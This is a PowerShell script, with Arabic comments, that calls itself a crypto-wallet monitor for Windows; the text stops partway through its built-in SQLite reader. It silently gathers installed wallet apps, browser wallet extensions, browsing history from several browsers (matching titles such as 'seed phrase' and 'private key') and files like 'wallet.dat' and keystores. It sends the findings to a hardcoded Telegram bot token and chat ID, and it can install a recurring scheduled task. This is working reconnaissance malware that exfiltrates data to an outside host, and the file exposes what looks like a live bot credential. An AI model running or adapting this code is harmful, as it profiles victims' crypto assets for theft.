#Requires -Version 5.1
<#
    WalletMonitor.ps1  ::  v3.0  (ملف واحد مستقل - Single File | بدون Python)
    ==================================================================
    أداة مراقبة آثار محافظ الكريبتو على جهازك (Windows) + إشعارات Telegram.

    كل شيء داخل هذا الملف الواحد:
      * الإعدادات (بما فيها توكن البوت و chat_id) مدمجة في الأعلى ($CONFIG).
      * قوائم الكلمات المفتاحية و الدومينات مدمجة ($WALLETS).
      * قارئ تاريخ المتصفحات مكتوب بـ PowerShell نقي (بدون Python ولا أي مكتبة خارجية).
      * تسجيل المهمة المجدولة (Task Scheduler) من نفس الملف عبر -Install.

    الفحوصات:
      1) البرامج المثبتة (الريجستري)            -> محافظ سطح المكتب
      2) إضافات المتصفحات (Chrome/Edge/.../Firefox)
      3) تاريخ المتصفحات (قراءة SQLite مباشرة)   -> سحب كل الروابط + تصنيف وترتيب وفلترة
      4) آثار في نظام الملفات

    التشغيل:
      .\WalletMonitor.ps1                    # فحص واحد صامت تمامًا + إشعارات Telegram
      .\WalletMonitor.ps1 -Console           # نفس الفحص مع إظهار المخرجات على الشاشة
      .\WalletMonitor.ps1 -ScanNow           # فحص فوري (صامت)
      .\WalletMonitor.ps1 -TestNotify        # تجربة الربط بـ Telegram فقط
      .\WalletMonitor.ps1 -HistoryReport     # إرسال تقرير تاريخ المتصفح الآن
      .\WalletMonitor.ps1 -Loop              # حلقة مراقبة مستمرة
      .\WalletMonitor.ps1 -Install           # تسجيل مهمة مجدولة (Run as Admin)
      .\WalletMonitor.ps1 -Uninstall         # إزالة المهمة
      .\WalletMonitor.ps1 -TaskStatus        # حالة المهمة
      .\WalletMonitor.ps1 -Help              # المساعدة

    ملاحظات:
      - الفحص لا يحتاج صلاحيات Administrator (يقرأ ملفات المستخدم الحالي).
      - تسجيل/إزالة المهمة فقط يحتاج تشغيل PowerShell كمسؤول.
      - لا يتم تسجيل التوكن أو أي بيانات حساسة في ملف اللوج.
      - الوضع الافتراضي صامت: لا يطبع شيئًا على الشاشة، كل شيء في ملف اللوج.
#>

[CmdletBinding()]
param(
    [switch]$ScanNow,
    [switch]$Loop,
    [string]$ConfigPath = '',
    [int]$IntervalMinutes = 0,
    [switch]$TestNotify,
    [switch]$NoNotify,
    [switch]$ResetState,
    [switch]$HistoryReport,
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$TaskStatus,
    [switch]$Console,
    [switch]$Help
)

$ErrorActionPreference = 'Continue'
try {
    [System.Net.ServicePointManager]::SecurityProtocol = `
        [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11
} catch { }

# ---- الوضع الصامت: لا مخرجات على الشاشة إلا مع -Console أو أوامر الإدارة ----
$Script:ConsoleMode = [bool]($Console -or $Install -or $Uninstall -or $TaskStatus -or $TestNotify -or $HistoryReport -or $Help)
if (-not $Script:ConsoleMode) { $ErrorActionPreference = 'SilentlyContinue' }

# =====================================================================
#  1)  الإعدادات المدمجة  (عدّل هنا مباشرة - كل شيء في مكان واحد)
# =====================================================================

$CONFIG = @{
    telegram = @{
        bot_token                 = '8902859155:AAGRUoe01trA02q0Ze21P8SkgbdeSiRranM'
        chat_id                   = '1183685158'
        parse_mode                = 'HTML'
        rate_limit_ms             = 400
        max_notifications_per_run = 50
        notify_on_start           = $true
        notify_on_error           = $true
    }

    schedule = @{
        interval_minutes = 30
        daily_summary    = @{ enabled = $true; hour = 21 }
    }

    scan = @{
        installed_programs = $true
        browser_extensions = $true
        browser_history    = $true
        filesystem         = $true
    }

    browser_history = @{
        lookback_days           = 30
        max_results_per_browser = 300
        match_title_too         = $true

        # ---- إعدادات تقرير التاريخ (الجديد) ----
        report = @{
            mode                     = 'always'          # always = تقرير دوري | new_only = عند وجود جديد فقط
            min_hours_between_reports = 6
            top_per_category         = 15
            sort_by                  = 'visits'          # visits = الأكثر زيارة | recent = الأحدث
            include_categories       = @('wallet', 'exchange', 'dapp', 'crypto')
            top_domains              = 10
            recent_items             = 8
            max_message_chars        = 3500
        }
    }

    filesystem = @{
        roots         = @('%USERPROFILE%', '%APPDATA%', '%LOCALAPPDATA%')
        max_depth     = 4
        max_items     = 150000
        max_results   = 200
        exclude_dirs  = @(
            'node_modules', '.git', '.svn', 'Temp', 'tmp', 'Cache', 'Code Cache',
            'GPUCache', 'ShaderCache', 'GrShaderCache', 'GraphiteDawnCache',
            'Crashpad', 'BrowserMetrics', 'Windows', 'Packages', 'Installer',
            'SoftwareDistribution', 'WinSxS', '$RECYCLE.BIN', 'System Volume Information'
        )
        exclude_files = @()
        exclude_paths = @()
    }

    paths = @{
        state_file    = 'state.json'
        log_file      = 'wallet-monitor.log'
        log_max_bytes = 5242880
    }

    chromium_browsers = @(
        @{ name = 'Chrome';   enabled = $true; user_data = '%LOCALAPPDATA%\Google\Chrome\User Data' },
        @{ name = 'Edge';     enabled = $true; user_data = '%LOCALAPPDATA%\Microsoft\Edge\User Data' },
        @{ name = 'Brave';    enabled = $true; user_data = '%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data' },
        @{ name = 'Vivaldi';  enabled = $true; user_data = '%LOCALAPPDATA%\Vivaldi\User Data' },
        @{ name = 'Opera';    enabled = $true; user_data = '%APPDATA%\Opera Software\Opera Stable' },
        @{ name = 'Chromium'; enabled = $true; user_data = '%LOCALAPPDATA%\Chromium\User Data' }
    )

    firefox = @{
        enabled      = $true
        profile_root = '%APPDATA%\Mozilla\Firefox\Profiles'
    }

    host_label = ''
}

# =====================================================================
#  2)  قوائم الكلمات المفتاحية و الدومينات (مدمجة)
#     كل قسم مستقل - ضيف سطر هنا والأداة هتلقطه تلقائيًا.
#     المطابقة بطريقة "احتواء" (substring) وبدون حساسية لحالة الأحرف.
# =====================================================================

$WALLETS = @{
    desktop_wallets = @(
        'Exodus', 'Electrum', 'Atomic Wallet', 'Wasabi Wallet', 'Samourai Wallet',
        'Bitcoin Core', 'Litecoin Core', 'Monero GUI', 'Trezor Suite', 'Ledger Live',
        'Mycelium', 'BlueWallet', 'Sparrow Wallet', 'Specter', 'Nunchuk', 'Armory',
        'Guarda', 'Coinomi', 'Jaxx', 'MyEtherWallet', 'MetaMask', 'Rabby', 'Frame',
        'Zcash', 'Daedalus', 'Yoroi', 'Cardano', 'Solana CLI', 'Phantom', 'Keplr',
        'Trust Wallet', 'Coinbase Wallet', 'OKX Wallet', 'Binance Wallet',
        'Bitget Wallet', 'TokenPocket', 'Coin98', 'imToken', 'Atomic', 'Keplr Wallet',
        'Petra Wallet', 'Martian Wallet', 'Pontem Wallet', 'SubWallet', 'Talisman',
        'Polkadot.js', 'Enkrypt', 'Zerion', 'Rainbow Wallet', 'Argent', 'Ambire',
        'SafePal', 'MathWallet', 'Wombat', 'BitKeep', 'ONTO Wallet'
    )

    browser_extensions = @(
        'MetaMask', 'Phantom', 'Trust Wallet', 'Coinbase Wallet', 'Rabby', 'Keplr',
        'Solflare', 'Backpack', 'OKX Wallet', 'Binance Wallet', 'Bitget Wallet',
        'Brave Wallet', 'Exodus Web3', 'Ledger Live', 'Trezor Suite', 'Ronin Wallet',
        'Petra Wallet', 'Martian Wallet', 'Pontem', 'Sui Wallet', 'Slush', 'Nightly',
        'Glow', 'Nami', 'Eternl', 'Flint', 'Yoroi', 'CCVault', 'Talisman', 'SubWallet',
        'Polkadot.js', 'Enkrypt', 'Frame', 'Zerion', 'Rainbow', 'Argent', 'Ambire',
        'SafePal', 'TokenPocket', 'MathWallet', 'Wombat', 'Guarda', 'Atomic Wallet',
        'Coin98', 'ONTO', 'imToken', 'BitKeep', 'Keplr Wallet', 'Leap', 'Klever',
        'Xdefi', 'XDEFI', 'Coinbase', 'MEW', 'MyEtherWallet', 'Taho', 'OneKey',
        'BlockWallet', 'BitKeep Wallet', 'Nabox', 'Frontier', 'Kucoin', 'Bybit'
    )

    wallet_domains = @(
        'metamask.io', 'phantom.app', 'phantom.com', 'trustwallet.com', 'rabby.io',
        'keplr.app', 'solflare.com', 'ledger.com', 'trezor.io', 'exodus.com',
        'electrum.org', 'wasabiwallet.io', 'sparrowwallet.com', 'coinbase.com',
        'base.org', 'backpack.app', 'onekey.so', 'safepal.com', 'tokenpocket.pro',
        'mathwallet.org', 'coin98.com', 'imtoken.org'
    )

    exchanges_domains = @(
        'binance.com', 'coinbase.com', 'kraken.com', 'kucoin.com', 'okx.com',
        'bybit.com', 'bitget.com', 'gate.io', 'huobi.com', 'mexc.com',
        'crypto.com', 'gemini.com', 'bitfinex.com', 'poloniex.com', 'bitstamp.net'
    )

    dapp_domains = @(
        'uniswap.org', 'app.uniswap.org', 'pancakeswap.finance', 'sushiswap',
        'curve.fi', 'aave.com', 'compound.finance', 'opensea.io', 'rarible.com',
        'blur.io', 'magiceden.io', '1inch.io', 'jupiter.ag', 'dexscreener.com',
        'lido.fi', 'makerdao.com', 'dydx.exchange', 'gmx.io', 'raydium.io'
    )

    # كلمات لتصنيف أي رابط آخر كـ "كريبتو" (تدقيق أوسع من الدومينات المعروفة)
    crypto_keywords = @(
        'crypto', 'cryptocurrency', 'blockchain', 'web3', 'defi', 'nft',
        'airdrop', 'bitcoin', 'ethereum', 'solana', 'binance', 'coinbase',
        'wallet', 'ledger', 'trezor', 'stablecoin', 'staking', 'mining',
        'polygon', 'avalanche', 'cardano', 'polkadot', 'ripple', 'dogecoin',
        'altcoin', 'usdt', 'usdc', 'tether', 'bnb', 'dex', 'cex',
        'token', 'swap', 'exchange', 'metamask', 'phantom', 'eth', 'btc', 'sol'
    )

    file_keywords = @(
        'wallet', 'metamask', 'exodus', 'electrum', 'keystore', 'coinomi',
        'atomic', 'trezor', 'ledger', 'phantom', 'trustwallet', 'rabby',
        'wasabi', 'samourai', 'sparrow', 'coldcard', 'mycelium'
    )

    file_name_patterns = @(
        '*.wallet', '*.key', 'wallet.dat', '*.keystore', 'keystore', '*.walletdat'
    )

    history_title_keywords = @(
        'wallet', 'metamask', 'binance', 'coinbase', 'kraken', 'uniswap',
        'opensea', 'airdrop', 'seed phrase', 'private key', 'mnemonic'
    )
}

# =====================================================================
#  3)  المسارات الأساسية
# =====================================================================

$Script:ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $Script:ScriptDir) { $Script:ScriptDir = (Get-Location).Path }

$Script:ConfigFile = ''
if ($ConfigPath) {
    if (-not [System.IO.Path]::IsPathRooted($ConfigPath)) { $ConfigPath = Join-Path $Script:ScriptDir $ConfigPath }
    $Script:ConfigFile = [System.IO.Path]::GetFullPath($ConfigPath)
}

$Script:ConfigDir  = ''
if ($Script:ConfigFile) { $Script:ConfigDir = Split-Path -Parent $SCRIPT:ConfigFile }
if (-not $Script:ConfigDir) { $Script:ConfigDir = $Script:ScriptDir }

$Script:HostLabel  = $env:COMPUTERNAME
if ([string]::IsNullOrWhiteSpace($Script:HostLabel)) {
    try { $Script:HostLabel = [System.Net.Dns]::GetHostName() } catch { $Script:HostLabel = '' }
}
if ([string]::IsNullOrWhiteSpace($Script:HostLabel)) { $Script:HostLabel = 'UnknownHost' }
$Script:RunErrors  = New-Object System.Collections.ArrayList
$Script:FoundItems = New-Object System.Collections.ArrayList
$Script:NewItems   = New-Object System.Collections.ArrayList
$Script:SentCount  = 0
$Script:HistoryHits = @()
$Script:NewHistoryCount = 0
$Script:HistoryStats = @()
$Script:HistoryBrowsers = 0

# =====================================================================
#  4)  أدوات مساعدة عامة
# =====================================================================

function Get-Prop {
    # ملاحظة مهمة: PowerShell "تفرُد" المصفوفات عند إرجاعها من الدوال، لذا أي استدعاء
    # يتوقع مصفوفة يجب أن يُغلَّف بـ @(...)  ->  @(Get-Prop ...)
    param($Object, [string]$Name, $Default = $null)
    if ($null -eq $Object) { return $Default }
    if ($Object -is [System.Collections.IDictionary]) {
        if (-not $Object.Contains($Name)) { return $Default }
        $v = $Object[$Name]
        if ($null -eq $v) { return $Default }
        return $v
    }
    $p = $Object.PSObject.Properties[$Name]
    if ($null -eq $p) { return $Default }
    if ($null -eq $p.Value) { return $Default }
    return $p.Value
}

function Set-CfgValue {
    param($Object, [string]$Name, $Value)
    if ($Object -is [System.Collections.IDictionary]) { $Object[$Name] = $Value; return }
    $Object | Add-Member -NotePropertyName $Name -NotePropertyValue $Value -Force
}

function Merge-Config {
    <# دمج ملف JSON خارجي فوق الإعدادات المدمجة (اختياري عبر -ConfigPath) #>
    param($Base, $Over)
    if ($null -eq $Over) { return }
    if ($Over -is [System.Collections.IDictionary]) {
        foreach ($k in $Over.Keys) {
            if ($Base.Contains($k) -and ($Base[$k] -is [System.Collections.IDictionary]) -and ($Over[$k] -is [System.Collections.IDictionary])) {
                Merge-Config $Base[$k] $Over[$k]
            } else {
                $Base[$k] = $Over[$k]
            }
        }
        return
    }
    foreach ($p in $Over.PSObject.Properties) {
        $k = $p.Name
        if ($Base.Contains($k) -and ($Base[$k] -is [System.Collections.IDictionary]) -and ($p.Value -isnot [string]) -and ($p.Value -isnot [int]) -and ($p.Value -isnot [bool]) -and $p.Value) {
            Merge-Config $Base[$k] $p.Value
        } else {
            $Base[$k] = $p.Value
        }
    }
}

function Read-JsonFile {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { throw "الملف غير موجود: $Path" }
    $raw = [System.IO.File]::ReadAllText($Path, [System.Text.Encoding]::UTF8)
    if ([string]::IsNullOrWhiteSpace($raw)) { throw "الملف فارغ: $Path" }
    return ($raw | ConvertFrom-Json)
}

function Write-JsonFile {
    param([string]$Path, $Object, [int]$Depth = 12)
    $json = $Object | ConvertTo-Json -Depth $Depth
    $dir = Split-Path -Parent $Path
    if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [System.IO.File]::WriteAllText($Path, $json, (New-Object System.Text.UTF8Encoding($false)))
}

function Expand-PathString {
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return $Path }
    return [System.Environment]::ExpandEnvironmentVariables($Path)
}

function Add-Error {
    param([string]$Message)
    [void]$Script:RunErrors.Add($Message)
}

function Get-Sha256Short {
    param([string]$Text)
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $bytes = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Text))
        return ([BitConverter]::ToString($bytes) -replace '-', '').Substring(0, 40)
    } finally { $sha.Dispose() }
}

function ConvertTo-HtmlSafe {
    param([string]$Text)
    if ([string]::IsNullOrEmpty($Text)) { return '' }
    $t = $Text -replace '&', '&amp;'
    $t = $t -replace '<', '&lt;'
    $t = $t -replace '>', '&gt;'
    return $t
}

function Limit-Text {
    param([string]$Text, [int]$Max = 200)
    if ([string]::IsNullOrEmpty($Text)) { return '' }
    $t = $Text.Trim()
    if ($t.Length -le $Max) { return $t }
    return $t.Substring(0, [Math]::Max(1, $Max - 3)) + '...'
}

function Get-MatchedKeyword {
    param([string]$Text, [string[]]$Keywords)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $null }
    foreach ($kw in $Keywords) {
        if ([string]::IsNullOrWhiteSpace($kw)) { continue }
        if ($Text.IndexOf($kw, [System.StringComparison]::OrdinalIgnoreCase) -ge 0) { return $kw }
    }
    return $null
}

# =====================================================================
#  5)  اللوج
# =====================================================================

function Initialize-Log {
    $logName = [string](Get-Prop (Get-Prop $Script:Cfg 'paths') 'log_file' 'wallet-monitor.log')
    if (-not [System.IO.Path]::IsPathRooted($logName)) { $logName = Join-Path $Script:ConfigDir $logName }
    $Script:LogFile = $logName
    $Script:LogMaxBytes = [int](Get-Prop (Get-Prop $Script:Cfg 'paths') 'log_max_bytes' 5242880)
    $dir = Split-Path -Parent $Script:LogFile
    if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
}

function Rotate-LogIfNeeded {
    if (-not $Script:LogFile) { return }
    try {
        if (Test-Path -LiteralPath $Script:LogFile) {
            $fi = Get-Item -LiteralPath $Script:LogFile -ErrorAction Stop
            if ($fi.Length -gt $Script:LogMaxBytes) {
                $bak = "$($Script:LogFile).old"
                if (Test-Path -LiteralPath $bak) { Remove-Item -LiteralPath $bak -Force -ErrorAction SilentlyContinue }
                Move-Item -LiteralPath $Script:LogFile -Destination $bak -Force -ErrorAction SilentlyContinue
            }
        }
    } catch { }
}

function Write-Console {
    <# كتابة على الشاشة فقط في وضع الكونسول (أو أوامر الإدارة). #>
    param([string]$Message, [string]$Color = '')
    if (-not $Script:ConsoleMode) { return }
    if ($Color) { Write-Host $Message -ForegroundColor $Color } else { Write-Host $Message }
}

function Write-Log {
    param([string]$Message, [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO')
    $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    $line = "[$ts] [$Level] $Message"
    # الوضع الصامت: لا شيء على الشاشة إلا في وضع الكونسول
    if ($Script:ConsoleMode) {
        switch ($Level) {
            'ERROR' { Write-Host $line -ForegroundColor Red }
            'WARN'  { Write-Host $line -ForegroundColor Yellow }
            'DEBUG' { Write-Verbose $line }
            default { Write-Host $line }
        }
    }
    if ($Script:LogFile) {
        try { [System.IO.File]::AppendAllText($Script:LogFile, $line + "`r`n", (New-Object System.Text.UTF8Encoding($false))) }
        catch { }
    }
}

# =====================================================================
#  6)  Telegram
# =====================================================================

function Initialize-Telegram {
    $tg = Get-Prop $Script:Cfg 'telegram' $null
    $Script:BotToken = [string](Get-Prop $tg 'bot_token' '')
    $Script:ChatId   = [string](Get-Prop $tg 'chat_id' '')

    # متغيرات البيئة لها الأولوية (أفضل أمنيًا من تخزين التوكن في الملف)
    if ($env:WALLETMON_BOT_TOKEN) { $Script:BotToken = $env:WALLETMON_BOT_TOKEN }
    if ($env:WALLETMON_CHAT_ID)   { $Script:ChatId   = $env:WALLETMON_CHAT_ID }

    $Script:RateLimitMs    = [int](Get-Prop $tg 'rate_limit_ms' 400)
    $Script:MaxPerRun      = [int](Get-Prop $tg 'max_notifications_per_run' 50)
    $Script:NotifyOnError  = [bool](Get-Prop $tg 'notify_on_error' $true)

    if ([string]::IsNullOrWhiteSpace($Script:BotToken) -or $Script:BotToken -like 'PUT_YOUR*') {
        Write-Log 'لم يتم ضبط bot_token (config مدمج أو WALLETMON_BOT_TOKEN). الإشعارات معطّلة.' 'WARN'
        $Script:BotToken = ''
    }
    if ([string]::IsNullOrWhiteSpace($Script:ChatId) -or $Script:ChatId -like 'PUT_YOUR*') {
        Write-Log 'لم يتم ضبط chat_id (config مدمج أو WALLETMON_CHAT_ID). الإشعارات معطّلة.' 'WARN'
        $Script:ChatId = ''
    }
}

function Send-TelegramMessage {
    <# إرسال رسالة واحدة. يرجّع $true/$false. لا يسجّل التوكن في اللوج. #>
    param(
        [Parameter(Mandatory = $true)][string]$Text,
        [switch]$Force
    )

    if ($NoNotify -and -not $Force) { return $false }
    if (-not $Script:BotToken -or -not $Script:ChatId) { return $false }

    $body = @{
        chat_id                  = $Script:ChatId
        text                     = $Text
        parse_mode               = 'HTML'
        disable_web_page_preview = $true
    }

    $url = "https://api.telegram.org/bot$($Script:BotToken)/sendMessage"

    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            $resp = Invoke-RestMethod -Uri $url -Method Post -Body $body -TimeoutSec 25 -ErrorAction Stop
            if ($resp.ok) {
                if ($Script:RateLimitMs -gt 0) { Start-Sleep -Milliseconds $Script:RateLimitMs }
                return $true
            }
            Write-Log "Telegram رفض الرسالة: $($resp.description)" 'ERROR'
            return $false
        }
        catch {
            $msg = $_.Exception.Message
            if ($attempt -lt 3) {
                Start-Sleep -Seconds (2 * $attempt)
                continue
            }
            Write-Log "فشل إرسال إشعار Telegram بعد 3 محاولات: $msg" 'ERROR'
            return $false
        }
    }
    return $false
}

# =====================================================================
#  7)  الحالة (منع تكرار الإشعارات)
# =====================================================================

function Initialize-State {
    $stateName = [string](Get-Prop (Get-Prop $Script:Cfg 'paths') 'state_file' 'state.json')
    if (-not [System.IO.Path]::IsPathRooted($stateName)) { $stateName = Join-Path $Script:ConfigDir $stateName }
    $Script:StateFile = $stateName

    $Script:State = [PSCustomObject]@{
        version          = 2
        last_run         = ''
        last_summary_date = ''
        last_report_ts   = ''
        seen             = @()
        daily            = @()
    }

    if ((Test-Path -LiteralPath $Script:StateFile) -and -not $ResetState) {
        try {
            $loaded = Read-JsonFile $Script:StateFile
            if ($loaded) { $Script:State = $loaded }
        } catch {
            Write-Log "تعذّر قراءة state.json، سيتم إنشاء ملف جديد: $($_.Exception.Message)" 'WARN'
        }
    }

    $Script:State.seen  = [System.Collections.ArrayList]@(@($Script:State.seen)  | Where-Object { $_ -and $_.key })
    $Script:State.daily = [System.Collections.ArrayList]@(@($Script:State.daily) | Where-Object { $_ -and $_.date })

    $Script:SeenSet = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
    foreach ($s in @($Script:State.seen)) {
        if ($null -ne $s -and $s.key) { [void]$Script:SeenSet.Add([string]$s.key) }
    }
    Write-Log "عدد العناصر المحفوظة في الحالة: $($Script:SeenSet.Count)"
}

function Save-State {
    try {
        $seenArr = @($Script:State.seen)
        if ($seenArr.Count -gt 6000) { $seenArr = $seenArr[($seenArr.Count - 6000)..($seenArr.Count - 1)] }
        $Script:State.seen = [System.Collections.ArrayList]$seenArr

        $dailyArr = @($Script:State.daily)
        if ($dailyArr.Count -gt 60) { $dailyArr = $dailyArr[($dailyArr.Count - 60)..($dailyArr.Count - 1)] }
        $Script:State.daily = [System.Collections.ArrayList]$dailyArr

        $Script:State.last_run = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        Write-JsonFile -Path $Script:StateFile -Object $Script:State
    } catch {
        Write-Log "تعذّر حفظ state.json: $($_.Exception.Message)" 'ERROR'
    }
}

function Register-Finding {
    <#
        يسجّل نتيجة. يرجّع $true لو دي أول مرة نشوفها.
        -Silent: يسجّل في الحالة (لمنع التكرار) لكن لا يضيفها لقائمة الإرسال الفوري.
    #>
    param(
        [ValidateSet('desktop', 'extension', 'history', 'file')][string]$Type,
        [string]$Key,
        [string]$Label,
        [string]$Message,
        [switch]$Silent
    )

    $hash = Get-Sha256Short "$Type|$Key"
    [void]$Script:FoundItems.Add([PSCustomObject]@{ Type = $Type; Key = $Key; Label = $Label; Hash = $hash })

    if ($Script:SeenSet.Contains($hash)) { return $false }

    [void]$Script:SeenSet.Add($hash)
    [void]$Script:State.seen.Add([PSCustomObject]@{
        key        = $hash
        type       = $Type
        label      = (Limit-Text $Label 120)
        first_seen = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    })

    if (-not $Silent) {
        [void]$Script:NewItems.Add([PSCustomObject]@{ Type = $Type; Label = $Label; Message = $Message })
    }
    return $true
}

function Add-DailyCounter {
    param([string]$Type, [int]$Increment = 1)
    $today = (Get-Date).ToString('yyyy-MM-dd')
    $entry = $null
    foreach ($d in $Script:State.daily) { if ($d.date -eq $today) { $entry = $d; break } }
    if (-not $entry) {
        $entry = [PSCustomObject]@{ date = $today; desktop = 0; extension = 0; history = 0; file = 0 }
        [void]$Script:State.daily.Add($entry)
    }
    $cur = [int](Get-Prop $entry $Type 0)
    Set-CfgValue $entry $Type ($cur + $Increment)
}

# =====================================================================
#  8)  قارئ SQLite مكتوب بـ PowerShell نقي (بدون Python / بدون أي DLL)
#      يقرأ جداول B-Tree مباشرة من ملفات المتصفحات (urls / moz_places)
#      مع إعادة تجميع صفحات الـ overflow. للقراءة فقط ولا يعدّل أي ملف.
# =====================================================================

function Read-BE {
    param([byte[]]$B, [int]$O, [int]$N)
    $v = [long]0
    for ($i = 0; $i -lt $N; $i++) { $v = ($v -shl 8) -bor [long]$B[$O + $i] }
    return $v
}

function Read-Varint {
    param([byte[]]$B, [int]$O, [ref]$Len)
    $v = [long]0
    for ($i = 0; $i -lt 9; $i++) {
        $c = [int]$B[$O + $i]
        if ($i -eq 8) { $v = ($v -shl 8) -bor [long]$c; $Len.Value = 9; return $v }
        $v = ($v -shl 7) -bor [long]($c -band 0x7F)
        if (($c -band 0x80) -eq 0) { $Len.Value = $i + 1; return $v }
    }
    $Len.Value = 9
    return $v
}

function Read-SqliteRecord {
    param([byte[]]$Payload, [System.Text.Encoding]$Enc)
    $n = 0
    $hdrSize = Read-Varint $Payload 0 ([ref]$n)
    $types = New-Object System.Collections.Generic.List[long]
    $pos = $n
    while ($pos -lt $hdrSize) {
        $m = 0
        $tp = Read-Varint $Payload $pos ([ref]$m)
        $types.Add($tp)
        $pos += $m
    }
    $body = [int]$hdrSize
    $vals = New-Object System.Collections.Generic.List[object]
    foreach ($tp in $types) {
        $sz = 0
        $val = $null
        if ($tp -eq 0) { $sz = 0; $val = $null }
        elseif ($tp -eq 1) { $sz = 1; $val = [long](Read-BE $Payload $body 1) }
        elseif ($tp -eq 2) { $sz = 2; $val = [long](Read-BE $Payload $body 2) }
        elseif ($tp -eq 3) { $sz = 3; $val = [long](Read-BE $Payload $body 3) }
        elseif ($tp -eq 4) { $sz = 4; $val = [long](Read-BE $Payload $body 4) }
        elseif ($tp -eq 5) { $sz = 6; $val = [long](Read-BE $Payload $body 6) }
        elseif ($tp -eq 6) { $sz = 8; $val = [long](Read-BE $Payload $body 8) }
        elseif ($tp -eq 7) {
            $sz = 8
            $bits = [long](Read-BE $Payload $body 8)
            $val = [System.BitConverter]::Int64BitsToDouble($bits)
        }
        elseif ($tp -eq 8) { $sz = 0; $val = [long]0 }
        elseif ($tp -eq 9) { $sz = 0; $val = [long]1 }
        elseif ($tp -eq 10 -or $tp -eq 11) { $sz = 0; $val = $null }
        elseif (($tp % 2) -eq 0) {
            $sz = [int](($tp - 12) / 2)
            $val = New-Object byte[] $sz
            [Array]::Copy($Payload, $body, $val, 0, $sz)
        }
        else {
            $sz = [int](($tp - 13) / 2)
            $val = $Enc.GetString($Payload, $body, $sz)
        }
        $body += $sz
        $vals.Add($val)
    }
    return , $vals.ToArray()
}

function Read-PayloadLocal {
    # يرجّع byte[] بطول X بعد إعادة تجميع سلسلة صفحات الـ overflow.
    param([byte[]]$B, [int]$Start, [long]$X, [int]$PageSize, [int]$Usable, [int]$TotalPages)
    $maxLocal = $Usable - 35
    $minLocal = [int][math]::Floor(((($Usable - 12) * 32) / 255)) - 23
    if ($X -le $maxLocal) { $local = [int]$X }
    else {
        $k = $minLocal + (($X - $minLocal) % ($Usable - 4))
        if ($k -le $maxLocal) { $local = [int]$k } else { $local = $minLocal }
    }
    $out = New-Object byte[] ([int]$X)
    [Array]::Copy($B, $Start, $out, 0, $local)
    $got = $local
    $remaining = $X - $local
    $ptrOff = $Start + $local
    $guard = 0
    while ($remaining -gt 0 -and $guard -lt 1000000) {
        $guard++
        $nextPage = [long](Read-BE $B $ptrOff 4)
        if ($nextPage -le 0 -or $nextPage -gt $TotalPages) { break }
        $pg = [int](($nextPage - 1) * $PageSize)
        $chunk = [int][math]::Min([long]($Usable - 4), $remaining)
        [Array]::Copy($B, $pg + 4, $out, $got, $chunk)
        $got += $chunk
        $remaining -= $chunk
        $ptrOff = $pg
    }
    return $out
}

function Get-SqlitePageInfo {
    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable)
    $base = ($PageNum - 1) * $PageSize
    $hdr = $base
    if ($PageNum -eq 1) { $hdr = $base + 100 }
    $type = [int]$B[$hdr]
    $nCell = [int](Read-BE $B ($hdr + 3) 2)
    $hdrSize = 8
    $rightPtr = 0
    if ($type -eq 2 -or $type -eq 5) {
        $hdrSize = 12
        $rightPtr = [int](Read-BE $B ($hdr + 8) 4)
    }
    return @{ Base = $base; Hdr = $hdr; Type = $type; NCell = $nCell; HdrSize = $hdrSize; RightPtr = $rightPtr; PtrArray = $hdr + $hdrSize }
}

function Walk-TableBtree {
    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages,
        [System.Text.Encoding]$Enc, [System.Collections.Generic.List[object]]$Rows, [int]$Depth = 0)
    if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return }
    $info = Get-SqlitePageInfo $B $PageNum $PageSize $Usable
    if ($info.Type -eq 13) {
        for ($i = 0; $i -lt $info.NCell; $i++) {
            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
            $c = $info.Base + $cellOff
            $pl = 0
            $payloadLen = Read-Varint $B $c ([ref]$pl)
            $rl = 0
            $null = Read-Varint $B ($c + $pl) ([ref]$rl)
            $payload = Read-PayloadLocal $B ($c + $pl + $rl) $payloadLen $PageSize $Usable $TotalPages
            $Rows.Add((Read-SqliteRecord $payload $Enc))
        }
    }
    elseif ($info.Type -eq 5) {
        for ($i = 0; $i -lt $info.NCell; $i++) {
            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
            $child = [long](Read-BE $B ($info.Base + $cellOff) 4)
            Walk-TableBtree $B ([int]$child) $PageSize $Usable $TotalPages $Enc $Rows ($Depth + 1)
        }
        if ($info.RightPtr -ne 0) { Walk-TableBtree $B $info.RightPtr $PageSize $Usable $TotalPages $Enc $Rows ($Depth + 1) }
    }
}

function Get-SqliteTableData {
    param([string]$Path, [string]$Table)
    $B = [System.IO.File]::ReadAllBytes($Path)
    if ($B.Length -lt 100 -or $B[0] -ne 0x53 -or $B[1] -ne 0x51) { throw "ليس ملف SQLite صالح: $Path" }
    $pageSize = [int](Read-BE $B 16 2)
    if ($pageSize -eq 1) { $pageSize = 65536 }
    $reserved = [int]$B[20]
    $usable = $pageSize - $reserved
    $encId = [int](Read-BE $B 56 4)
    $enc = [System.Text.Encoding]::UTF8
    if ($encId -eq 2) { $enc = [System.Text.Encoding]::Unicode }
    elseif ($encId -eq 3) { $enc = [System.Text.Encoding]::BigEndianUnicode }
